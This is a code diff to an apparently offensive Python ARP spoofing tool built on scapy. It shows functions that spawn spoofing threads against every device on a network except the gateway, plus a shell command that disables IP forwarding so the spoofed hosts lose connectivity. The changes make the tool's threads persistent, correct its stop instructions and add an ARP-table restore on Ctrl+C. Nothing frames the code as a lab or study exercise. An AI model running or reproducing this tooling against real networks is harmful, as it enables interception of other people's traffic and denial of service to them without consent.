@@ -55,12 +55,17 @@ def start_spoofing_threads(target_ip_list, gateway_ip):
     command = "echo 0 >/proc/sys/net/ipv4/ip_forward"
     subprocess.run(command, shell=True, check=True)
     index =1
+    threads = []
     for target_ip in target_ip_list:
         if target_ip != gateway_ip:
             print("spoofed",target_ip,"device - index",index)
             index=index+1
             thread = threading.Thread(target=spoof_thread, args=(target_ip, gateway_ip))
+            thread.daemon = True  # Set the thread as daemon
             thread.start()
+            threads.append(thread)  
+    for thread in threads:
+        thread.join()
 
 def get_ip_devices(router_ip):
     arp_request = scapy.ARP(pdst=router_ip)
@@ -133,17 +138,22 @@ def act():
     global modIndex
 
     if args.mode == "1":
-        print("[+] Mode 1 acted - press ctrl+z to stop the process nicely")
+        print("[+] Mode 1 acted - press ctrl+C to stop the process nicely")
         modIndex = 1
         Function1or2(args)
     elif args.mode == "2":
-        print("[+] Mode 2 acted - press ctrl+z to stop the process nicely")
+        print("[+] Mode 2 acted - press ctrl+C to stop the process nicely")
         modIndex = 2
         Function1or2(args)
     elif args.mode == "3":
-        print("[+] Mode 3 acted  - press ctrl+z to stop the process nicely ")
+        print("[+] Mode 3 acted  - press ctrl+C to stop the process nicely ")
         modIndex = 3
-        Function3(args)
+        try:
+            Function3(args)
+        except KeyboardInterrupt:
+            print("\nCtrl+C detected, stopping ARP spoofing and restoring ARP tables. Please wait...\n")
+            restore(args.target, args.gateway)
+            print("ARP table restored.")
     else:
         parser = CustomArgumentParser()
         parser.error("Invalid mode. Please specify mode as 1 or 2.")
